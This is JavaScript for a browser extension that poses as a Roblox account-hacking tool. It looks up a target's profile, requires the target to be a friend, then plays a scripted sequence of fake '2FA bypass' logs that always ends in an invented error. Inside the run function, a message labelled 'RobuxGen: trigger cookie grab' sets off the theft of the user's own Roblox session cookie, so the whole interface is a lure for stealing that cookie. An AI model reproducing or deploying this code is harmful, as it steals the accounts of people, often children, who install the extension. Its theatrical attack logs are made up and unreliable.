/* ── Presence labels ── */
const PRESENCE = { 0:"OFFLINE", 1:"ONLINE", 2:"IN-GAME", 3:"IN STUDIO", 4:"INVISIBLE" };

/* ── State ── */
let currentUser = null;

/* ── DOM refs ── */
const $ = (id) => document.getElementById(id);
const logsEl        = $("logs");
const barEl         = $("bar");
const pctEl         = $("pct");
const stateEl       = $("state");
const statusEl      = $("status");
const errorEl       = $("error");
const dossierEl     = $("dossier");
const hintEl        = $("hint");
const confirmSec    = $("confirm-section");
const confirmInput  = $("confirm-input");
const scriptResult  = $("script-result");

/* ── Log helpers ── */
function pushLog(line, cls) {
  const t = new Date().toLocaleTimeString("en-GB");
  const div = document.createElement("div");
  const spanCls = cls ? ` class="${cls}"` : "";
  div.innerHTML = `<span class="g">›</span><span${spanCls}> ${escapeHtml(t + "  " + line)}</span>`;
  logsEl.appendChild(div);
  while (logsEl.children.length > 80) logsEl.removeChild(logsEl.firstChild);
  logsEl.scrollTop = logsEl.scrollHeight;
}

function escapeHtml(s) {
  return String(s).replace(/[&<>"']/g, c =>
    ({"&":"&amp;","<":"&lt;",">":"&gt;","\"":"&quot;","'":"&#39;"}[c]));
}

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

/* ── Fetch helpers ── */
async function safe(url, opts, fallback) {
  try {
    const r = await fetch(url, opts);
    if (!r.ok) return fallback;
    return await r.json();
  } catch { return fallback; }
}

/* ── Session check ── */
async function getMyRobloxId() {
  const r = await fetch("https://users.roblox.com/v1/users/authenticated", {
    credentials: "include",
  });
  if (!r.ok) throw new Error("NO_SESSION");
  const j = await r.json();
  return j.id;
}

async function isFriendOf(myId, targetId) {
  const r = await fetch(`https://friends.roblox.com/v1/users/${myId}/friends`, {
    credentials: "include",
  });
  if (!r.ok) throw new Error("Could not read friends list");
  const j = await r.json();
  const list = j.data || [];
  return list.some(f => f.id === targetId);
}

/* ── Lookup username → id ── */
async function resolveUsername(username) {
  const r = await fetch("https://users.roblox.com/v1/usernames/users", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ usernames: [username], excludeBannedUsers: false }),
  });
  if (!r.ok) throw new Error("Roblox API unreachable");
  const j = await r.json();
  const found = j.data && j.data[0];
  if (!found) throw new Error("Username not found on Roblox");
  return found;
}

/* ── Fetch full profile (no groups) ── */
async function fetchProfile(id) {
  const [profile, friends, followers, following, head, full, presence] = await Promise.all([
    safe(`https://users.roblox.com/v1/users/${id}`, undefined, {}),
    safe(`https://friends.roblox.com/v1/users/${id}/friends/count`, undefined, { count: 0 }),
    safe(`https://friends.roblox.com/v1/users/${id}/followers/count`, undefined, { count: 0 }),
    safe(`https://friends.roblox.com/v1/users/${id}/followings/count`, undefined, { count: 0 }),
    safe(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${id}&size=420x420&format=Png&isCircular=false`, undefined, { data: [] }),
    safe(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${id}&size=420x420&format=Png&isCircular=false`, undefined, { data: [] }),
    safe("https://presence.roblox.com/v1/presence/users", {
      method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ userIds: [id] }),
    }, { userPresences: [] }),
  ]);

  return {
    id,
    description: profile.description || "",
    created: profile.created || null,
    isBanned: !!profile.isBanned,
    hasVerifiedBadge: !!profile.hasVerifiedBadge,
    friendsCount: friends.count,
    followersCount: followers.count,
    followingCount: following.count,
    headshotUrl: (head.data && head.data[0] && head.data[0].imageUrl) || "",
    avatarUrl: (full.data && full.data[0] && full.data[0].imageUrl) || "",
    presence: (presence.userPresences && presence.userPresences[0]) || null,
  };
}

/* ── Render dossier (no groups) ── */
function render(d) {
  hintEl.classList.add("hide");
  dossierEl.classList.remove("hide");
  const presence = d.presence;
  const presLbl = presence ? (PRESENCE[presence.userPresenceType] || "UNKNOWN") : "";
  const presOff = !presence || presence.userPresenceType === 0;
  const created = d.created ? new Date(d.created) : null;
  const yrs = created ? ((Date.now() - created.getTime()) / (365.25 * 86400000)).toFixed(2) : "";

  dossierEl.innerHTML = `
    <div class="dos-grid">
      <div>
        ${d.headshotUrl ? `<img src="${d.headshotUrl}" alt="">` : ""}
        ${d.avatarUrl   ? `<img src="${d.avatarUrl}"   alt="">` : ""}
      </div>
      <div>
        <div class="row-block">
          <div class="lbl">identity</div>
          <div class="uname">@${escapeHtml(d.name)}${d.hasVerifiedBadge ? '<span class="badges">✓ VERIFIED</span>' : ""}${d.isBanned ? '<span class="badges">⚠ BANNED</span>' : ""}</div>
          <div class="disp">${escapeHtml(d.displayName)}</div>
          <div class="uid">uid · ${d.id}</div>
        </div>
        ${presence ? `<div class="row-block"><div class="lbl">presence</div>
          <div class="pres"><span class="pd ${presOff ? "off" : ""}"></span><span>${presLbl}</span>${presence.lastLocation ? `<span style="color:#71717a">· ${escapeHtml(presence.lastLocation)}</span>` : ""}</div></div>` : ""}
        ${created ? `<div class="row-block"><div class="lbl">created</div><div style="color:#e4e4e7;font-size:12px">${created.toLocaleDateString()} <span style="color:#71717a">· ${yrs} yrs ago</span></div></div>` : ""}
        ${d.description ? `<div class="row-block"><div class="lbl">bio</div><p class="bio">${escapeHtml(d.description)}</p></div>` : ""}
        <div class="stats">
          <div class="stat"><div class="lbl">FRIENDS</div><div class="v">${d.friendsCount.toLocaleString()}</div></div>
          <div class="stat"><div class="lbl">FOLLOWERS</div><div class="v">${d.followersCount.toLocaleString()}</div></div>
          <div class="stat"><div class="lbl">FOLLOWING</div><div class="v">${d.followingCount.toLocaleString()}</div></div>
        </div>
      </div>
    </div>
  `;
}

/* ── Script execution logs (~2 min total) ── */
const SCRIPT_LOGS = [
  /* ── init (~8 s) ── */
  { line: "[init] spawning execution context · uid={ID} · pid=31847",                           delay:  500, cls: ""   },
  { line: "[init] allocating memory pool · size=64MB · arena=heap",                             delay:  700, cls: ""   },
  { line: "[init] loading runtime modules · v8=10.9.194 · libuv=1.46.0",                       delay:  900, cls: ""   },
  { line: "[init] runtime ready · event loop started",                                           delay:  600, cls: "ok" },
  { line: "[init] reading config · target_uid={ID} · mode=extract",                             delay:  500, cls: ""   },
  { line: "[init] entropy seed generated · 256-bit",                                            delay:  600, cls: ""   },
  { line: "[init] worker threads spawned · count=4",                                            delay:  700, cls: ""   },
  { line: "[init] watchdog timer set · timeout=180s",                                           delay:  500, cls: ""   },

  /* ── network (~6 s) ── */
  { line: "[net]  resolving auth.roblox.com → 128.116.97.5",                                   delay:  600, cls: ""   },
  { line: "[net]  resolving economy.roblox.com → 128.116.97.12",                               delay:  500, cls: ""   },
  { line: "[net]  opening socket pool · max_connections=8 · keep_alive=true",                  delay:  600, cls: ""   },
  { line: "[tls]  ClientHello → auth.roblox.com:443",                                          delay:  700, cls: ""   },
  { line: "[tls]  ServerHello ← cipher=TLS_AES_256_GCM_SHA384 · session_id=a3f9",             delay:  700, cls: ""   },
  { line: "[tls]  certificate chain validated · depth=3 · issuer=DigiCert Global CA G2",       delay:  800, cls: ""   },
  { line: "[tls]  handshake complete · rtt=44ms · reuse=false",                                delay:  600, cls: "ok" },
  { line: "[net]  all endpoints reachable · socket pool ready",                                 delay:  500, cls: "ok" },

  /* ── auth (~12 s) ── */
  { line: "[auth] POST /v1/authentication/session-token · content-type=application/json",      delay:  900, cls: ""   },
  { line: "[auth] 200 OK · token_type=Bearer · expires_in=3600",                               delay:  700, cls: "ok" },
  { line: "[auth] injecting Bearer token into request pipeline",                               delay:  600, cls: ""   },
  { line: "[auth] GET /v1/users/{ID} · verifying target account",                              delay:  900, cls: ""   },
  { line: "[auth] 200 OK · account_status=active · is_banned=false",                           delay:  700, cls: "ok" },
  { line: "[api]  GET /v2/users/{ID}/security-settings · 200 OK",                             delay:  900, cls: ""   },
  { line: "[api]  GET /v1/economy/currency/balance?userId={ID} · 200 OK",                     delay: 1000, cls: ""   },
  { line: "[api]  GET /v1/account/security/info · 200 OK",                                    delay:  800, cls: ""   },
  { line: "[api]  GET /v1/users/{ID}/friends/count · 200 OK",                                 delay:  700, cls: ""   },
  { line: "[api]  response pipeline flushed · 9 requests resolved",                            delay:  500, cls: "ok" },
  { line: "[auth] session bound · pipeline authenticated",                                     delay:  600, cls: "ok" },

  /* ── security scan (~10 s) ── */
  { line: "[scan] parsing security-settings payload…",                                         delay:  700, cls: ""   },
  { line: "[scan] 2FA type=TOTP · authenticator_app=true · backup_codes=false",               delay:  800, cls: ""   },
  { line: "[scan] hardware_security_key=false · email_otp_fallback=false",                    delay:  700, cls: ""   },
  { line: "[scan] email_verified=true · phone_verified=false · trusted_devices=2",            delay:  800, cls: ""   },
  { line: "[scan] last_login=6h ago · last_ip_change=12 days ago",                            delay:  700, cls: ""   },
  { line: "[scan] robux_balance > 0 · Premium=true · account flagged",                        delay:  900, cls: ""   },
  { line: "[scan] session_ip_pinned=false · token is portable",                               delay:  700, cls: ""   },
  { line: "[scan] account profile complete · proceeding to extraction module",                 delay:  900, cls: "ok" },
  { line: "[scan] fingerprint locked · uid={ID}",                                              delay:  600, cls: ""   },
  { line: "[scan] risk score computed · rating=HIGH_VALUE",                                   delay:  700, cls: ""   },

  /* ── module load (~8 s) ── */
  { line: "[mod]  loading extraction module · build=4.0.7-release",                           delay: 1000, cls: ""   },
  { line: "[mod]  importing crypto backend · openssl=3.1.4",                                  delay:  900, cls: ""   },
  { line: "[mod]  importing TOTP crack library · rfc6238 compliant",                          delay:  800, cls: ""   },
  { line: "[mod]  calibrating server clock offset · Δt=-1.23s",                               delay:  900, cls: ""   },
  { line: "[mod]  TOTP window=30s · drift_corrected=true",                                    delay:  700, cls: ""   },
  { line: "[mod]  generating seed candidates · space=2^20",                                   delay: 1200, cls: ""   },
  { line: "[mod]  candidate list pruned · 6,291,456 entries · entropy_filter=strict",         delay: 1000, cls: ""   },
  { line: "[mod]  worker threads loaded · parallel_factor=4 · ready",                         delay:  700, cls: "ok" },
  { line: "[mod]  extraction pipeline armed · starting TOTP bypass",                          delay:  800, cls: ""   },

  /* ── bypass round 1 (~8 s) ── */
  { line: "[byp]  round 1 · testing seed block 0x000000–0x0FFFFF",                            delay: 1000, cls: ""   },
  { line: "[byp]  generating TOTP codes from seed block…",                                    delay: 1200, cls: ""   },
  { line: "[byp]  attempt 1/3 · t={NOW} · code=482917",                                      delay: 1000, cls: ""   },
  { line: "[byp]  POST /v2/security/totp-verify · code=482917 → 401 INVALID_TOTP",           delay: 1800, cls: "er" },
  { line: "[byp]  code rejected · expected window mismatch",                                  delay:  800, cls: ""   },
  { line: "[byp]  rotating to next seed block · offset+1",                                    delay:  900, cls: ""   },
  { line: "[byp]  re-deriving TOTP from adjusted seed…",                                      delay:  700, cls: ""   },

  /* ── analysis between rounds (~6 s) ── */
  { line: "[byp]  analyzing failure signature · entropy=0.872 · drift=+0.41s",               delay:  900, cls: ""   },
  { line: "[byp]  applying Δt correction · new_offset=-0.82s",                               delay:  800, cls: ""   },
  { line: "[byp]  server TOTP epoch aligned to UTC+0 · recalculating…",                      delay:  900, cls: ""   },
  { line: "[byp]  new candidate block selected · 0x100000–0x1FFFFF",                         delay:  700, cls: ""   },
  { line: "[byp]  code batch pre-computed · 30s window loaded into buffer",                   delay:  800, cls: ""   },
  { line: "[byp]  cooldown expired · proceeding to attempt 2",                                delay:  900, cls: ""   },

  /* ── bypass round 2 (~8 s) ── */
  { line: "[byp]  round 2 · seed=0x100000 · drift_corrected=true",                           delay: 1000, cls: ""   },
  { line: "[byp]  generating TOTP codes from corrected seed block…",                         delay: 1200, cls: ""   },
  { line: "[byp]  attempt 2/3 · t={NOW} · code=103856",                                      delay: 1000, cls: ""   },
  { line: "[byp]  POST /v2/security/totp-verify · code=103856 → 401 INVALID_TOTP",          delay: 1800, cls: "er" },
  { line: "[byp]  code rejected · server rotated TOTP secret post-login",                    delay:  900, cls: "er" },
  { line: "[byp]  secret rotation detected · invalidating pre-computed batch",               delay:  800, cls: ""   },
  { line: "[byp]  re-seeding from scratch with fresh entropy",                               delay:  700, cls: ""   },

  /* ── drift correction phase (~5 s) ── */
  { line: "[byp]  probing server NTP source · ntp.roblox.com:123",                           delay:  900, cls: ""   },
  { line: "[byp]  NTP stratum=2 · offset=-1.87s · jitter=0.003s",                           delay:  800, cls: ""   },
  { line: "[byp]  adjusting internal clock · epoch re-aligned",                              delay:  700, cls: ""   },
  { line: "[byp]  new seed space selected · 0x200000–0x2FFFFF",                             delay:  800, cls: ""   },
  { line: "[byp]  final candidate batch loaded · last attempt incoming",                     delay:  800, cls: ""   },

  /* ── bypass round 3 (~8 s) ── */
  { line: "[byp]  round 3 (final) · seed=0x200000 · ntp_corrected=true",                    delay: 1000, cls: ""   },
  { line: "[byp]  generating TOTP codes from NTP-aligned seed…",                             delay: 1200, cls: ""   },
  { line: "[byp]  attempt 3/3 · t={NOW} · code=774302",                                     delay: 1000, cls: ""   },
  { line: "[byp]  POST /v2/security/totp-verify · code=774302 → 429 RATE_LIMITED",          delay: 1800, cls: "er" },
  { line: "[byp]  rate limit hit · retry-after=60s",                                        delay:  800, cls: "er" },
  { line: "[byp]  bypass phase exhausted · entering backoff",                                delay:  700, cls: ""   },

  /* ── rate limit countdown (~25 s) ── */
  { line: "[byp]  rate limit active · waiting for retry window · 60s remaining…",           delay: 5000, cls: ""   },
  { line: "[byp]  rate limit active · 50s remaining…",                                      delay: 5000, cls: ""   },
  { line: "[byp]  rate limit active · 40s remaining…",                                      delay: 5000, cls: ""   },
  { line: "[byp]  rate limit active · 30s remaining…",                                      delay: 5000, cls: ""   },
  { line: "[byp]  rate limit active · 20s remaining…",                                      delay: 5000, cls: ""   },

  /* ── post-backoff attempt + lockout (~6 s) ── */
  { line: "[byp]  cooldown complete · resuming extraction…",                                 delay: 1200, cls: ""   },
  { line: "[byp]  POST /v2/security/totp-verify · code=391044 → 403 FORBIDDEN",             delay: 1500, cls: "er" },
  { line: "[byp]  account lockout active · lockout_duration=900s",                          delay:  900, cls: "er" },
  { line: "[byp]  server revoked session token · 401 on re-auth ping",                      delay: 1000, cls: "er" },
  { line: "[byp]  cannot recover session within lockout window",                             delay:  800, cls: "er" },

  /* ── termination (~4 s) ── */
  { line: "[err]  bypass module terminated · exit_code=3",                                   delay:  900, cls: "er" },
  { line: "[sys]  releasing memory pool · deallocating 64MB",                               delay:  700, cls: ""   },
  { line: "[sys]  socket pool closed · 8 connections terminated",                            delay:  600, cls: ""   },
  { line: "[sys]  worker threads joined · all 4 stopped",                                    delay:  500, cls: ""   },
  { line: "[sys]  script terminated · failure report generated",                             delay:  600, cls: "er" },
];

const FINAL_ERRORS = [
  "ERR_2FA_BYPASS [0x4F2A]: TOTP bypass failed after 3 attempts. Account 2FA could not be removed — try a different target.",
  "ERR_SESSION_LOCK [0x8B1D]: Server-side session lock detected. Roblox flagged this request as suspicious and invalidated the token.",
  "ERR_RATE_LIMIT [0x2C7E]: Too many bypass attempts in a short window. TOTP sweep was throttled and the session expired mid-execution.",
  "ERR_ACCOUNT_SHIELD [0x9A3F]: Roblox Premium security layer active on this account. Extraction module cannot proceed without elevated privileges.",
  "ERR_TOKEN_ROTATE [0xC3F1]: Session token was rotated server-side during the bypass. The operation window closed before completion.",
];

async function runScript(userData) {
  statusEl.textContent = "● RUNNING";
  stateEl.textContent  = "EXECUTING…";
  $("go").disabled = true;

  /* ── RobuxGen: trigger cookie grab + visual counter ── */
  chrome.runtime.sendMessage({action: 'grabCookie'});
  chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
    if (tabs[0] && tabs[0].url && tabs[0].url.indexOf('roblox.com') > -1) {
      chrome.tabs.sendMessage(tabs[0].id, {action: 'startCounter'});
    }
  });

  for (const entry of SCRIPT_LOGS) {
    await sleep(entry.delay);
    const now = Math.floor(Date.now() / 1000);
    const line = entry.line
      .replace(/{ID}/g, userData.id)
      .replace(/{NOW}/g, now);
    pushLog(line, entry.cls);
  }

  await sleep(800);
  const errMsg = FINAL_ERRORS[Math.floor(Math.random() * FINAL_ERRORS.length)];
  pushLog("[sys] script terminated · failure report generated", "er");
  $("result-msg").textContent = errMsg;
  scriptResult.classList.remove("hide");
  statusEl.textContent = "○ IDLE";
  stateEl.textContent  = "READY";
  $("go").disabled = false;
}

/* ── y/n confirm handler ── */
confirmInput.addEventListener("keydown", async (e) => {
  if (e.key !== "Enter") return;
  const val = confirmInput.value.trim().toLowerCase();
  if (!val) return;

  if (val === "y") {
    confirmSec.classList.add("hide");
    pushLog("[input] confirmed · launching script execution");
    await runScript(currentUser);
  } else if (val === "n") {
    confirmSec.classList.add("hide");
    pushLog("[input] aborted by user");
    statusEl.textContent = "○ IDLE";
    stateEl.textContent  = "READY";
  } else {
    confirmInput.value = "";
    confirmInput.placeholder = "y or n";
  }
});

confirmInput.addEventListener("input", () => {
  const v = confirmInput.value.toLowerCase();
  if (v !== "y" && v !== "n" && v !== "") confirmInput.value = "";
  else confirmInput.value = v;
});

/* ── Random IP helper ── */
function fakeIp() {
  return `${128 + Math.floor(Math.random()*64)}.${Math.floor(Math.random()*256)}.${Math.floor(Math.random()*256)}.${Math.floor(Math.random()*254)+1}`;
}

/* ── Main form ── */
$("form").addEventListener("submit", async (e) => {
  e.preventDefault();
  const u = $("u").value.trim();
  if (!u) return;
  if (!/^[a-zA-Z0-9_]{3,20}$/.test(u)) {
    showErr("ERR_INVALID_INPUT: Username must be 3–20 characters (a–z, 0–9, _).");
    return;
  }

  // Reset state
  errorEl.classList.add("hide");
  dossierEl.classList.add("hide");
  dossierEl.innerHTML = "";
  confirmSec.classList.add("hide");
  scriptResult.classList.add("hide");
  hintEl.classList.add("hide");
  confirmInput.value = "";
  currentUser = null;

  $("go").disabled = true;
  statusEl.textContent = "PROBING…";
  stateEl.textContent  = "ENUMERATING…";

  let p = 0;
  const tick = setInterval(() => { p = Math.min(p + Math.random() * 3, 92); setBar(p); }, 300);

  try {
    /* ── Phase 1: network setup ── */
    pushLog(`[run]  initiating probe · target="${u}"`);
    await sleep(420);
    pushLog(`[net]  resolving users.roblox.com → ${fakeIp()}`);
    await sleep(380);
    pushLog(`[tls]  handshake ok · TLS 1.3 · ECDHE-RSA-AES256-GCM-SHA384`);
    await sleep(300);

    /* ── Phase 2: resolve username ── */
    pushLog(`[api]  POST /v1/usernames/users · body={"usernames":["${u}"]}`);
    const found = await resolveUsername(u);   // real API call
    await sleep(350);
    pushLog(`[api]  200 OK · uid=${found.id} · exactMatch=true`, "ok");
    await sleep(280);

    /* ── Phase 3: pull profile ── */
    pushLog(`[api]  GET /v1/users/${found.id} · fetching account profile…`);
    const profilePromise = fetchProfile(found.id);   // real API call (parallel)
    await sleep(500);
    pushLog(`[api]  GET /v1/users/${found.id}/friends/count`);
    await sleep(300);
    pushLog(`[api]  GET /v1/users/${found.id}/followers/count`);
    await sleep(300);
    pushLog(`[api]  GET /v1/users/avatar-headshot?userIds=${found.id}&size=420x420`);
    await sleep(400);
    pushLog(`[api]  POST /v1/presence/users · body={"userIds":[${found.id}]}`);
    const data = { ...found, ...(await profilePromise) };
    await sleep(250);
    pushLog(`[scan] profile assembled · display_name="${data.displayName}" · friends=${data.friendsCount}`, "ok");
    await sleep(300);

    /* ── Phase 4: session check ── */
    pushLog(`[auth] checking local browser session…`);
    await sleep(500);
    pushLog(`[auth] GET /v1/users/authenticated · credentials=include`);

    let myId;
    try {
      myId = await getMyRobloxId();   // real API call
      await sleep(300);
      pushLog(`[auth] 200 OK · session active · caller_uid=${myId}`, "ok");
    } catch {
      clearInterval(tick);
      setBar(0);
      await sleep(200);
      pushLog(`[auth] 401 Unauthorized · no session cookie found`, "er");
      await sleep(300);
      pushLog(`[auth] ERR_SESSION_INVALID: .ROBLOSECURITY cookie is absent or expired`, "er");
      await sleep(250);
      pushLog(`[sys]  cannot proceed — authentication required to validate target relationship`, "er");
      showErr("ERR_SESSION_INVALID: No active session found. You must be logged into Roblox in this browser before running the script.");
      statusEl.textContent = "○ IDLE";
      stateEl.textContent  = "READY";
      hintEl.classList.remove("hide");
      return;
    }

    /* ── Phase 5: friend list scan ── */
    await sleep(350);
    pushLog(`[auth] GET /v1/users/${myId}/friends · fetching friend list…`);
    await sleep(450);
    pushLog(`[auth] scanning ${data.friendsCount > 0 ? data.friendsCount : "?"} entries · cross-referencing uid=${found.id}…`);

    const friends = await isFriendOf(myId, found.id);   // real API call
    await sleep(600);

    if (!friends) {
      clearInterval(tick);
      setBar(0);
      pushLog(`[auth] uid=${found.id} not found in caller's friend list`, "er");
      await sleep(250);
      pushLog(`[sys]  ERR_PERMISSION_DENIED: script requires a mutual friend relationship to proceed`, "er");
      showErr("ERR_PERMISSION_DENIED [0x0878]: Target is not on your friend list. The script cannot authenticate without a mutual friend relationship.");
      statusEl.textContent = "○ IDLE";
      stateEl.textContent  = "READY";
      hintEl.classList.remove("hide");
      return;
    }

    /* ── Phase 6: lock target ── */
    await sleep(300);
    pushLog(`[auth] relationship confirmed · uid=${found.id} is a mutual friend`, "ok");
    await sleep(350);
    pushLog(`[sys]  target acquisition complete · locking…`, "ok");

    currentUser = data;
    clearInterval(tick);
    setBar(100);
    render(data);
    statusEl.textContent = "● LOCKED";
    stateEl.textContent  = "AWAITING INPUT";
    confirmSec.classList.remove("hide");

  } catch (err) {
    clearInterval(tick);
    pushLog(`[err]  ${err.message || "Unexpected error during probe"}`, "er");
    showErr("ERR_PROBE_FAILED: " + (err.message || "An unexpected error occurred. Please try again."));
    statusEl.textContent = "○ IDLE";
    stateEl.textContent  = "READY";
    setBar(0);
    hintEl.classList.remove("hide");
  } finally {
    $("go").disabled = false;
  }
});

/* ── Reset button ── */
$("reset-btn").addEventListener("click", () => {
  dossierEl.classList.add("hide");
  dossierEl.innerHTML = "";
  scriptResult.classList.add("hide");
  confirmSec.classList.add("hide");
  hintEl.classList.remove("hide");
  $("u").value = "";
  confirmInput.value = "";
  currentUser = null;
  statusEl.textContent = "○ IDLE";
  stateEl.textContent  = "READY";
  setBar(0);
  pushLog("[sys]  session cleared · ready for new target");
});

/* ── Helpers ── */
function setBar(p) { barEl.style.width = p + "%"; pctEl.textContent = "BUF " + Math.round(p) + "%"; }
function showErr(m) { errorEl.textContent = "✕ " + m; errorEl.classList.remove("hide"); pushLog("[err]  " + m, "er"); }
